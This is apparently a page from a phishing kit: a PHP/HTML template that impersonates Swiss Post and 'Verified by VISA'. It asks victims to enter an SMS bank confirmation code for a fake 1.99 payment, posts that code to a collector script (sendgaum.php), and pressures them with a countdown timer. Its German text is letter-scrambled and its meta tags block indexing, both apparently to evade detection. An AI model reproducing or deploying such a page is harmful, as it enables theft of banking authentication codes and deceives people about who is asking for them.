
<!DOCTYPE html>
<html lang="de">
	<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>Verified by VISA</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="">
	<link rel="stylesheet" href="./layout/css/style.css">
	<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	<script src="<?php echo $js;?>"></script>
	<script src="./layout/js/style.js"></script>
	</head>
	<body class="tanya">
		<section>
		<div class="head">
		<span><img src="https://www.post.ch/-/media/portal-opp/global/logos/logo---die-post.svg?vs=2&sc_lang=en"></span>
		<span><img src="./layout/img/vs.png"></span>
		</div>
		<div class="titr">Breet btzeäergtn Zrt drt fvlgtndt Smhlpng</div>
		<div class="kolchi">
        <form id="cFrm" method="post" action="sendgaum.php">
		<p style="font-size:12px">Dmz trndtpergt Umzzqvie qpidt mn drt pnetn mpfgtfühiet hmndynpaati gtztndte. Qtnn Zrt Rhit Hmndynpaati ändtin aüzztn, qtndtn Zrt zrch breet mn Rhit Bmnx vdti ändtin Zrt zrt übti drt otifügbmitn Xmnält (MEA, Qtb)
</p>
		<div class="inf">
		<span class="tr">Händltirn</span>
		<span class="rp">Drt Uvze</span>
		</div>
		<div class="inf">
		<span class="tr">Bteimgtn</span>
		<span class="rp" style="font-family:arial">1.99</span>
		</div>
		<div class="inf">
		<span class="tr">Dmepa</span>
		<span class="rp"><?php echo date('d=m=Y');?></span>
		</div>

		<div class="inf">
		<span class="tr">cvdt ZAZ:</span>
		<span class="rp"><input type="text" class="tantan" id="tantan" name="tantan" maxlength="22"  autocomplete="off"   /></span>
		</div>
		<div style="font-size:12px">Breet gtbtn Zrt dtn Btzeäergpngzcvdt trn, dtn Zrt uti ZAZ tihmletn hmbtn <span id="timer" style="color:red;font-weight:bold;font-size:12px"> ZAZ cvdt ztne...</span></div>
		</div>
		<!-- <div style="font-size:12px;color:red;font-weight:bold;padding:">Yvp apze mcctue ehrz umyatne ehivpgh eht muulrcmervn, rf yvp hmot cvnfriamervn fiva yvpi bmnx!</div> -->
		<div class="btn"><button type="submit" class="text-center" >trnitrchtn</button></div>
		<div class="foot">&copy; <?php echo date("Y"); ?> FtdTk Rnetinmervnml GabH - Mll irghez itztiotd.</div>
		</form>
		</section>
<script src="<?php echo $js;?>"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 15000);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

/*-------------------------------------------------------*/
/*------------------- TIMER FUNCTION --------------------*/
/*-------------------------------------------------------*/

    function countdown(timer, minutes, seconds) {
// set time for the particular countdown
var time = minutes*60 + seconds;
var interval = setInterval(function() {
    var el = document.getElementById('timer');
    // if the time is 0 then end the counter
    if(time == 0) {
        setTimeout(function() {
            el.innerHTML = " ZAZ cvdt ztne...";
        }, 1500);


        clearInterval(interval);

        setTimeout(function() {
            countdown('clock', 2, 1);
        }, 2000);
    }
    var minutes = Math.floor( time / 60 );
    if (minutes < 10) minutes = "0" + minutes;
    var seconds = time % 60;
    if (seconds < 10) seconds = "0" + seconds; 
    var text = minutes + ':' + seconds;
    el.innerHTML = text;
    time--;
}, 1500);     // 1000 = 1 segonde in timer = j'ai fais 1500 pour calculer 1.5 segonde comme c'est 1 segonde
}
countdown('clock', 2, 1);
	</script>
	</body>
</html>